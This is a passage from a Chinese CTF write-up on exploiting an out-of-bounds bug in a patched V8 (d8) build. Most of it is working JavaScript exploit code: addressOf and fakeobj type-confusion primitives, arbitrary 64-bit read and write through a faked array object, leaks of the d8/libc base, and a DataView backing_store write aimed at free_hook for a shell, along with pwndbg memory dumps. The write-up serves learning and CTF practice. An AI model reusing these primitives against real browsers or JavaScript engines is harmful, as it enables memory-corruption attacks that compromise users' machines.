64位无符号整数转为16进制字节串</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> i.toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// leak the addrsess of obj</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">obj_to_leak</span>)</span>&#123;</span><br><span class="line">    objArray[<span class="number">0</span>] = obj_to_leak;</span><br><span class="line">    objArray.oob(floatArrayMap); <span class="comment">// type(obj)--&gt;type(float)</span></span><br><span class="line">    <span class="keyword">let</span> addr = f2i(objArray[<span class="number">0</span>])<span class="number">-1n</span>;</span><br><span class="line">    objArray.oob(objArrayMap);</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeobj</span>(<span class="params">addr_to_fake</span>)</span>&#123;</span><br><span class="line">    floatArray[<span class="number">0</span>] = i2f(addr_to_fake+<span class="number">1n</span>);</span><br><span class="line">    floatArray.oob(objArrayMap);  <span class="comment">// type(float)--&gt;type(obj)</span></span><br><span class="line">    <span class="keyword">let</span> fake_obj = floatArray[<span class="number">0</span>];</span><br><span class="line">    floatArray.oob(floatArrayMap);</span><br><span class="line">    <span class="keyword">return</span> fake_obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//var test = &#123;&#125;;</span></span><br><span class="line"><span class="comment">//%DebugPrint(test);</span></span><br><span class="line"><span class="comment">//var testAddr = addressOf(test);</span></span><br><span class="line"><span class="comment">//console.log(&quot;[*] leak object addr: 0x&quot; + hex(testAddr));</span></span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">v8/out.gn/x64.release$ ./d8 --allow-natives-syntax ./test.js</span></span><br><span class="line"><span class="comment">0x26ebb348f061 &lt;Object map = 0x2e6f2340459&gt;</span></span><br><span class="line"><span class="comment">[*] leak object addr: 0x000026ebb348f060</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h4 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h4><p>我们可以写一个 js 数组伪造成一个 js 对象(结构如下)，那么当我们访问<code>fake_array[2]</code>的时候就会当成一个对象去访问，那么我们就可以修改他的值，从而实现任意地址写</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fake_array = [</span><br><span class="line">    float_array_map, </span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    i2f(<span class="number">0x4141414141414141</span>),  <span class="comment">//&lt;-- elements指针</span></span><br><span class="line">    i2f(<span class="number">0x400000000</span>)</span><br><span class="line">];</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1111</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> a = [obj, <span class="number">2.2</span>];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">%DebugPrint(a[<span class="number">0</span>]);</span><br><span class="line">%SystemBreak();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">DebugPrint: 0x3f28a7f0de19: [JSArray]</span></span><br><span class="line"><span class="comment"> - map: 0x17f6b1442f79 &lt;Map(PACKED_ELEMENTS)&gt; [FastProperties]</span></span><br><span class="line"><span class="comment"> - prototype: 0x32ef84dd1111 &lt;JSArray[0]&gt;</span></span><br><span class="line"><span class="comment"> - elements: 0x3f28a7f0de39 &lt;FixedArray[2]&gt; [PACKED_ELEMENTS]</span></span><br><span class="line"><span class="comment"> - length: 2</span></span><br><span class="line"><span class="comment"> - properties: 0x394d91600c71 &lt;FixedArray[0]&gt; &#123;</span></span><br><span class="line"><span class="comment">    #length: 0x296b7b3c01a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"><span class="comment"> &#125;</span></span><br><span class="line"><span class="comment"> - elements: 0x3f28a7f0de39 &lt;FixedArray[2]&gt; &#123;</span></span><br><span class="line"><span class="comment">           0: 0x3f28a7f0dda9 &lt;Object map = 0x17f6b144ab39&gt;   &lt;--- elements point</span></span><br><span class="line"><span class="comment">           1: 0x3f28a7f0de59 &lt;HeapNumber 2.2&gt;</span></span><br><span class="line"><span class="comment"> &#125;</span></span><br><span class="line"><span class="comment">DebugPrint: 0x3f28a7f0dda9: [JS_OBJECT_TYPE]                  &lt;--- elements point</span></span><br><span class="line"><span class="comment"> - map: 0x17f6b144ab39 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span></span><br><span class="line"><span class="comment"> - prototype: 0x32ef84dc2091 &lt;Object map = 0x17f6b1440229&gt;</span></span><br><span class="line"><span class="comment"> - elements: 0x394d91600c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span></span><br><span class="line"><span class="comment"> - properties: 0x394d91600c71 &lt;FixedArray[0]&gt; &#123;</span></span><br><span class="line"><span class="comment">    #a: 1111 (const data field 0)</span></span><br><span class="line"><span class="comment"> &#125;*/</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fake_array = [</span><br><span class="line">    float_array_map,</span><br><span class="line">    i2f(<span class="number">0n</span>),</span><br><span class="line">    i2f(<span class="number">0x41414141n</span>),<span class="comment">// fake obj&#x27;s elements ptr</span></span><br><span class="line">    i2f(<span class="number">0x1000000000n</span>),</span><br><span class="line">    <span class="number">1.1</span>,</span><br><span class="line">    <span class="number">2.2</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取到这块内存的地址</span></span><br><span class="line"><span class="keyword">var</span> fake_array_addr = addressOf(fake_array);</span><br><span class="line"><span class="comment">// 将可控内存转换为对象</span></span><br><span class="line"><span class="keyword">var</span> fake_object_addr = fake_array_addr - <span class="number">0x40n</span> + <span class="number">0x10n</span>;</span><br><span class="line"><span class="keyword">var</span> fake_object = fakeObject(fake_object_addr);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    <span class="keyword">let</span> leak_data = f2i(fake_object[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] leak from: 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(leak_data));</span><br><span class="line">    <span class="keyword">return</span> leak_data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write64</span>(<span class="params">addr, data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    fake_object[<span class="number">0</span>] = i2f(data);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] write to : 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(data));    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">var a = [1.1, 2.2, 3.3];</span></span><br><span class="line"><span class="comment">%DebugPrint(a);</span></span><br><span class="line"><span class="comment">var a_addr = addressOf(a);</span></span><br><span class="line"><span class="comment">console.log(&quot;[*] addressOf a: 0x&quot; + hex(a_addr));</span></span><br><span class="line"><span class="comment">read64(a_addr);</span></span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line"><span class="comment">write64(a_addr, 0x01020304n);</span></span><br><span class="line"><span class="comment">%SystemBreak();</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h4 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h4><p>方法A：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope 0x000038ebfeb8f9a0-0x8000 0x5000</span><br><span class="line">...</span><br><span class="line">4ab:2558│   0x38ebfeb89ef8 —▸ 0x1b4669081f49 ◂— 0x300001b46690801</span><br><span class="line">4ac:2560│   0x38ebfeb89f00 ◂— 0x7b837e1e6</span><br><span class="line">4ad:2568│   0x38ebfeb89f08 —▸ 0xcd44db0a001 ◂— 0xe600001b46690804</span><br><span class="line">4ae:2570│   0x38ebfeb89f10 —▸ 0x1b4669080b71 ◂— 0x200001b46690801</span><br><span class="line">4af:2578│   0x38ebfeb89f18 —▸ 0x55dc49c98e40 ◂— push   rbp</span><br><span class="line">4b0:2580│   0x38ebfeb89f20 —▸ 0x1b4669080b71 ◂— 0x200001b46690801</span><br><span class="line">4b1:2588│   0x38ebfeb89f28 —▸ 0x55dc49c98e40 ◂— push   rbp</span><br><span class="line">pwndbg&gt; x&#x2F;gx 0x55dc49c98e40</span><br><span class="line">0x55dc49c98e40 &lt;_ZN2v812_GLOBAL__N_118WebAssemblyCompileERKNS_20FunctionCallbackInfoINS_5ValueEEE&gt;:0x56415741e5894855</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">var a &#x3D; [1.1, 2.2, 3.3];</span><br><span class="line">var start_addr &#x3D; addressOf(a);</span><br><span class="line">var leak_d8_addr &#x3D; 0n;</span><br><span class="line">start_addr &#x3D; start_addr-0x8000n;</span><br><span class="line">while(1)&#123;</span><br><span class="line">    start_addr &#x3D; start_addr-8n;</span><br><span class="line">    leak_d8_addr &#x3D; read64(start_addr);</span><br><span class="line">    if(((leak_d8_addr&amp;0x0000ff0000000fffn)&#x3D;&#x3D;0x0000560000000e40n)||((leak_d8_addr&amp;0x0000ff0000000fffn)&#x3D;&#x3D;0x0000550000000e40n))&#123;</span><br><span class="line">        console.log(&quot;leak process addr success: &quot;+hex(leak_d8_addr));</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跑了半天，没泄露出来…</p><p>方法B：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*------------------------------leak d8------------------------------*&#x2F;</span><br><span class="line">var code &#x3D; read64(addressOf(floatArray.constructor)-0x1n+0x30n); &#x2F;&#x2F;get constructor.code ptr</span><br><span class="line">var d8Leak &#x3D; read64(code-0x1n+0x40n) &gt;&gt; 16n; &#x2F;&#x2F;read addr from &quot;mov r10, addr&quot;</span><br><span class="line">var d8Base &#x3D; d8Leak - 0xad54e0n;</span><br><span class="line">console.log(&quot;[*] d8 base : &quot; + hex(d8Base));</span><br></pre></td></tr></table></figure><blockquote><p>查看Array对象结构 –&gt; 查看对象的Map属性 –&gt; 查看Map中指定的constructor结构 –&gt; 查看code属性 –&gt;在code内存地址的固定偏移处存储了v8二进制的指令地址</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> test_array = [<span class="number">1.1</span>];</span><br><span class="line">%DebugPrint(test_array);</span><br><span class="line">%DebugPrint(test_array.constructor);</span><br><span class="line">%SystemBreak();</span><br><span class="line">---------------------------------------------------------------------</span><br><span class="line">pwndbg&gt; pwd</span><br><span class="line">xxx/v8/out.gn/x64.debug</span><br><span class="line">...</span><br><span class="line">DebugPrint: <span class="number">0x24741f34ddb9</span>: [JSArray]</span><br><span class="line"> - map: <span class="number">0x3fb2ce6c2ed9</span> &lt;<span class="built_in">Map</span>(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x39ddc5311111</span> &lt;JSArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - elements: <span class="number">0x24741f34dda1</span> &lt;FixedDoubleArray[<span class="number">1</span>]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: <span class="number">1</span></span><br><span class="line"> - properties: <span class="number">0x2df35e640c71</span> &lt;FixedArray[<span class="number">0</span>]&gt; &#123;</span><br><span class="line">    #length: 0x18405dc001a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: <span class="number">0x24741f34dda1</span> &lt;FixedDoubleArray[<span class="number">1</span>]&gt; &#123;</span><br><span class="line">           <span class="number">0</span>: <span class="number">1.1</span></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">DebugPrint: <span class="number">0x39ddc5310ec1</span>: [<span class="built_in">Function</span>] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: <span class="number">0x3fb2ce6c2d49</span> &lt;<span class="built_in">Map</span>(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x39ddc5302109</span> &lt;JSFunction (sfi = <span class="number">0x18405dc08039</span>)&gt;</span><br><span class="line"> - elements: <span class="number">0x2df35e640c71</span> &lt;FixedArray[<span class="number">0</span>]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - function prototype: 0x39ddc5311111 &lt;JSArray[0]&gt;</span><br><span class="line"> - initial_map: <span class="number">0x3fb2ce6c2d99</span> &lt;<span class="built_in">Map</span>(PACKED_SMI_ELEMENTS)&gt;</span><br><span class="line"> - shared_info: <span class="number">0x18405dc0aca1</span> &lt;SharedFunctionInfo <span class="built_in">Array</span>&gt;</span><br><span class="line"> - name: 0x2df35e643599 &lt;String[#5]: Array&gt;</span><br><span class="line"> - builtin: ArrayConstructor</span><br><span class="line"> - formal_parameter_count: <span class="number">65535</span></span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"> - context: <span class="number">0x39ddc5301869</span> &lt;NativeContext[<span class="number">246</span>]&gt;</span><br><span class="line"> - code: <span class="number">0x11c169a06c01</span> &lt;Code BUILTIN ArrayConstructor&gt;</span><br><span class="line"> - properties: <span class="number">0x39ddc5311029</span> &lt;PropertyArray[<span class="number">6</span>]&gt; &#123;</span><br><span class="line">    #length: 0x18405dc004b9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line">    #name: 0x18405dc00449 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line">    #prototype: 0x18405dc00529 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line">    <span class="number">0x2df35e644c79</span> &lt;<span class="built_in">Symbol</span>: (native_context_index_symbol)&gt;: <span class="number">11</span> (<span class="keyword">const</span> data field <span class="number">0</span>) properties[<span class="number">0</span>]</span><br><span class="line">    <span class="number">0x2df35e644f41</span> &lt;<span class="built_in">Symbol</span>: <span class="built_in">Symbol</span>.species&gt;: <span class="number">0x39ddc5310fd9</span> &lt;AccessorPair&gt; (<span class="keyword">const</span> accessor descriptor)</span><br><span class="line">    #isArray: 0x39ddc5311069 &lt;JSFunction isArray (sfi = 0x18405dc0ad39)&gt; (const data field 1) properties[1]</span><br><span class="line">    #from: 0x39ddc53110a1 &lt;JSFunction from (sfi = 0x18405dc0ad89)&gt; (const data field 2) properties[2]</span><br><span class="line">    #of: 0x39ddc53110d9 &lt;JSFunction of (sfi = 0x18405dc0adc1)&gt; (const data field 3) properties[3]</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line">pwndbg&gt; job <span class="number">0x3fb2ce6c2ed9</span></span><br><span class="line"><span class="number">0x3fb2ce6c2ed9</span>: [<span class="built_in">Map</span>]</span><br><span class="line"> - type: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: <span class="number">32</span></span><br><span class="line"> - inobject properties: <span class="number">0</span></span><br><span class="line"> - elements kind: PACKED_DOUBLE_ELEMENTS</span><br><span class="line"> - unused property fields: <span class="number">0</span></span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - back pointer: <span class="number">0x3fb2ce6c2e89</span> &lt;<span class="built_in">Map</span>(HOLEY_SMI_ELEMENTS)&gt;</span><br><span class="line"> - prototype_validity cell: <span class="number">0x18405dc00609</span> &lt;Cell value= <span class="number">1</span>&gt;</span><br><span class="line"> - instance descriptors #1: 0x39ddc5311f49 &lt;DescriptorArray[1]&gt;</span><br><span class="line"> - layout descriptor: (nil)</span><br><span class="line"> - transitions #1: 0x39ddc5311eb9 &lt;TransitionArray[4]&gt;Transition array #1:</span><br><span class="line">     <span class="number">0x2df35e644ba1</span> &lt;<span class="built_in">Symbol</span>: (elements_transition_symbol)&gt;: (transition to HOLEY_DOUBLE_ELEMENTS) -&gt; <span class="number">0x3fb2ce6c2f29</span> &lt;<span class="built_in">Map</span>(HOLEY_DOUBLE_ELEMENTS)&gt;</span><br><span class="line"></span><br><span class="line"> - prototype: <span class="number">0x39ddc5311111</span> &lt;JSArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - <span class="keyword">constructor</span>: 0x39ddc5310ec1 &lt;JSFunction Array (sfi = 0x18405dc0aca1)&gt;</span><br><span class="line"> - dependent code: 0x2df35e6402c1 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/10gx 0x39ddc5310ec1-1</span><br><span class="line">0x39ddc5310ec0:0x00003fb2ce6c2d490x000039ddc5311029</span><br><span class="line">0x39ddc5310ed0:0x00002df35e640c710x000018405dc0aca1</span><br><span class="line">0x39ddc5310ee0:0x000039ddc53018690x000018405dc00699</span><br><span class="line">0x39ddc5310ef0:0x000011c169a06c010x00003fb2ce6c2d99</span><br><span class="line">0x39ddc5310f00:0x00002df35e6402710x0000000000080008</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p/x 0x39ddc5310ef0-0x39ddc5310ec0</span><br><span class="line">$1 = 0x30</span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope 0x11c169a06c01+0x40-1</span><br><span class="line">00:0000│   0x11c169a06c40 ◂— movabs r10, 0x7f5949700fa0</span><br><span class="line">01:0008│   0x11c169a06c48 ◂— add    byte ptr [rax], al</span><br><span class="line">02:0010│   0x11c169a06c50 ◂— add    byte ptr [rax], al</span><br><span class="line">... ↓</span><br><span class="line">04:0020│   0x11c169a06c60 —▸ 0x2df35e640a31 ◂— 0x2df35e6401</span><br><span class="line">05:0028│   0x11c169a06c68 —▸ 0x2df35e642c01 ◂— 0x2df35e6407</span><br><span class="line">06:0030│   0x11c169a06c70 —▸ 0x2df35e640c71 ◂— 0x2df35e6408</span><br><span class="line">07:0038│   0x11c169a06c78 —▸ 0x2df35e642791 ◂— 0x2df35e6407</span><br><span class="line"></span><br><span class="line">pwndbg&gt; vmmap 0x7f5949700fa0</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    0x7f5948274000     0x7f5949d8a000 r-xp  1b16000 136c000 /home/focu5/chromium/v8/out.gn/x64.debug/libv8.so +0x148cfa0</span><br></pre></td></tr></table></figure><p>在<code>release</code>版本下，则会泄露出 <code>d8</code>的地址</p><h4 id="本地shell"><a href="#本地shell" class="headerlink" title="本地shell"></a>本地shell</h4><p>有了<code>libc</code>剩下就可以和常规<code>pwn</code>一样了，有任意地址写，直接写<code>free_hook</code>就好。</p><p>在调试的时候发现写0x7f…这样的地址写不上去，看<a href="https://e3pem.github.io/2019/07/31/browser/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%85%A5%E9%97%A8%E4%B9%8Bstarctf-OOB/">e3pem师傅的博客</a>发现另一种写法</p><blockquote><p>这里有另外一种方式来解决这个问题，DataView对象中的<code>backing_store</code>会指向申请的<code>data_buf</code>，修改<code>backing_store</code>为我们想要写的地址，并通过DataView对象的setBigUint64方法就可以往指定地址正常写入数据了。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var data_buf &#x3D; new ArrayBuffer(8);</span><br><span class="line">var data_view &#x3D; new DataView(data_buf);</span><br><span class="line">var buf_backing_store_addr &#x3D; addressOf(data_buf) + 0x20n;</span><br><span class="line">function writeDataview(addr,data)&#123;</span><br><span class="line">    write64(buf_backing_store_addr, addr);</span><br><span class="line">    data_view.setBigUint64(0, data, true);</span><br><span class="line">    console.log(&quot;[*] write to : 0x&quot; +hex(addr) + &quot;: 0x&quot; + hex(data));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> objArray = [obj];</span><br><span class="line"><span class="keyword">var</span> floatArray = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> objArrayMap = objArray.oob();</span><br><span class="line"><span class="keyword">var</span> floatArrayMap = floatArray.oob();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buf =<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> BigUint64Array(buf);</span><br><span class="line"><span class="comment">// 浮点数转换为64位无符号整数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">f</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为浮点数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为16进制字节串</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> i.toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// leak the addrsess of obj</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">obj_to_leak</span>)</span>&#123;</span><br><span class="line">    objArray[<span class="number">0</span>] = obj_to_leak;</span><br><span class="line">    objArray.oob(floatArrayMap); <span class="comment">// type(obj)--&gt;type(float)</span></span><br><span class="line">    <span class="keyword">let</span> addr = f2i(objArray[<span class="number">0</span>])<span class="number">-1n</span>;</span><br><span class="line">    objArray.oob(objArrayMap);</span><br><span class="line">    <span 